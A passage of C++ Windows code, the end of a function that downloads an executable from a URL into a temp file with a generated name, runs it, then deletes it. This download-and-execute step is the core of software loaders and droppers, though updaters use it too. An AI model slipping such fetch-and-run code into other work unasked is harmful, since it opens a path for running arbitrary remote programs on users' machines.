    std::wstring downloadPath = tempDir + L"downloaded_exe_" + std::to_wstring(GetTickCount64()) + L"_" + std::to_wstring(GetCurrentProcessId()) + L".exe";
    std::wstring error;
    if (!DownloadFile(url, downloadPath, error)) { std::wcerr << error << L"\n"; DeleteFileW(downloadPath.c_str()); return 1; }
    if (!ExecuteFile(downloadPath, error)) { std::wcerr << error << L"\n"; DeleteFileW(downloadPath.c_str()); return 1; }
    DeleteFileW(downloadPath.c_str());
    return 0;
}

